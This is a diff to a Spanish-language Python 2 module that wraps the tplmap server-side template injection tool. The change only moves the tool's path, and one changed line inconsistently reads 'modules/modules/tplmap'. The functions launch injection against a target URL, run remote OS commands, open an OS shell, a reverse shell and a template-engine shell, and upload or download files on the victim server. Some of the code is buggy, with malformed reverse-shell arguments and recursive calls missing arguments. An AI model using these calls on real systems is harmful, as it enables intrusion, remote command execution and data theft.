@@ -24,7 +24,7 @@ def normalssti():
     ssitarget=sqlimod.urlglob()
     level=sqlimod.lev()
     ssitarget=str(ssitarget)
-    injected=subprocess.call(["python2","tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level])
+    injected=subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level])
     if injected==0:
         postssti()
     else:
@@ -41,7 +41,7 @@ def sstipost():
     if ssitarget != "" and "." in ssitarget:
         ssipost=sqlimod.postglob()
         level=sqlimod.lev()
-        subprocess.call(["python2","tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level])
+        subprocess.call(["python2","modules/modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level])
 
     else:
         checker.cRojo("La URL esta vacia o no es valida, intentalo de nuevo.\n")
@@ -50,18 +50,18 @@ def sstipost():
 def remotecommand(mode):
     command=raw_input("Ingresa el comando que deseas ejecutar en el sistema remoto: ")
     if command != "" and mode == "normal":
-        subprocess.call(["python2","tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level,"--os-cmd="+command])
+        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level,"--os-cmd="+command])
     elif command != "" and mode == "post":
-        subprocess.call(["python2","tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--os-cmd="+command])
+        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--os-cmd="+command])
     else:
         checker.cRojo("Ha ocurrido un error, intentadolo de nuevo.\n")
         remotecommand()
 
 def osshell(mode):
     if mode == "normal":
-        subprocess.call(["python2","tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level,"--os-shell"])
+        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level,"--os-shell"])
     elif mode == "post":
-        subprocess.call(["python2","tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--os-shell"])
+        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--os-shell"])
     else:
         checker.cRojo("Ha ocurrido un error, intentandolo de nuevo.\n")
         osshell()
@@ -69,13 +69,13 @@ def osshell(mode):
 def localtoremote(mode,force):
     ruta=raw_input("Introduce la ruta del archivo local (Ej. /home/user/test.py): ")
     if ruta != "" and "/" in ruta and mode == "normal" and force == "no":
-        subprocess.call(["python2","tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level,"--upload="+ruta])
+        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level,"--upload="+ruta])
     elif ruta != "" and "/" in ruta and mode == "post" and force == "no":
-        subprocess.call(["python2","tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--upload="+ruta])
+        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--upload="+ruta])
     elif ruta != "" and "/" in ruta and mode == "normal" and force == "si":
-        subprocess.call(["python2","tplmap/tplmap.py","--force-overwrite","-A",useragent,"-u",ssitarget,"--level",level,"--upload="+ruta])
+        subprocess.call(["python2","modules/tplmap/tplmap.py","--force-overwrite","-A",useragent,"-u",ssitarget,"--level",level,"--upload="+ruta])
     elif ruta != "" and "/" in ruta and mode == "post" and force == "si":
-        subprocess.call(["python2","tplmap/tplmap.py","--force-overwrite","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--upload="+ruta])
+        subprocess.call(["python2","modules/tplmap/tplmap.py","--force-overwrite","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--upload="+ruta])
     else:
         checker.cRojo("Ha ocurrido un error, intentandolo de nuevo.\n")
         localtoremote()
@@ -83,9 +83,9 @@ def localtoremote(mode,force):
 def downfiles(mode):
     ruta=raw_input("Introduce la ruta del archivo que deseas descargar (Ej. /maquina/remota/mysql.db): ")
     if ruta != "" and "/" in ruta and mode == "normal":
-        subprocess.call(["python2","tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level,"--download="+ruta])
+        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level,"--download="+ruta])
     elif ruta != "" and "/" in ruta and mode == "post":
-        subprocess.call(["python2","tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--download="+ruta])
+        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--download="+ruta])
     else:
         checker.cRojo("Ha ocurrido un error, intentandolo de nuevo.\n")
         downfiles()
@@ -94,9 +94,9 @@ def reverseshell(mode):
     host="127.0.0.1"
     port=raw_input("Introduce el puerto local al que deseas conectar la Bind Shell: ")
     if port != "" and mode == "normal":
-         subprocess.call(["python2","tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level,"--reverse-shell"+host+port])
+         subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level,"--reverse-shell"+host+port])
     elif port != "" and mode == "post":
-        subprocess.call(["python2","tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--reverse-shell"+host+port])
+        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--reverse-shell"+host+port])
     else:
         checker.cRojo("Ha ocurrido un error, intentandolo de nuevo.\n")
         reverseshell()
@@ -105,9 +105,9 @@ def templateshell(mode):
     try:
         checker.cAmarillo("Intentando establecer una shell con el Template Engine...")
         if mode == "normal":
-            subprocess.call(["python2","tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level,"--tpl-shell"])
+            subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level,"--tpl-shell"])
         elif mode == "post":
-            subprocess.call(["python2","tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--tpl-shell"])
+            subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--tpl-shell"])
         else:
             checker.cRojo("Ha ocurrido un error.")
     except:
